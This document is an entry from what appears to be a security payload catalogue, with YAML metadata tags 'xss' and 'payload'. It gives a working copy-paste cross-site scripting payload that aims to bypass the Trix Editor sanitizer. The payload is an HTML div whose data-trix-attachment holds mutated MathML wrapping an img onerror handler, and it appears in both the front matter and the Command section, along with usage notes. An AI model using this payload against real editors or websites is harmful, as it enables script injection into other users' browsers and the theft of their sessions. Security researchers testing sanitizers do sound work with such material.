---
data: >-
  <!DOCTYPE html><html><body><div
  data-trix-attachment="{\"contentType\":\"text/html5\",\"content\":\"&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img
  src=x onerror=alert()&gt;&lt;/style&gt;XSSPOC\"}"></div>copy me</body></html>
tags:
  - xss
  - payload
type: command
output: Browser displays 'copy me' with hidden payload.
executor: html
platforms:
  - Web
id: f932cc2c-e509-45f2-ba80-5c31e8cd0c49
created_at: '2025-12-13T23:55:06.759Z'
updated_at: '2025-12-13T23:55:06.759Z'
verified: false
validated: true
submitted: true
---
# copy-payload-html

## Command

```html
<div data-trix-attachment="{\"contentType\":\"text/html5\",\"content\":\"&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSSPOC\"}"></div>copy me
```

## Description

Generates HTML for copy-paste XSS payload targeting Trix Editor sanitizer bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| data-trix-attachment | JSON with contentType and mutated MathML | Yes |
| content | Encoded <math> structure with img onerror | Yes |

## Examples

### Basic Usage

```html
<div data-trix-attachment="{...}">copy me</div>
```

### Advanced Usage

Embed in full HTML file for browser rendering.

## Expected Output

Selectable 'copy me' text with encoded payload in clipboard on copy.

## Related

- [[commands/decoded-mathml-xss]]
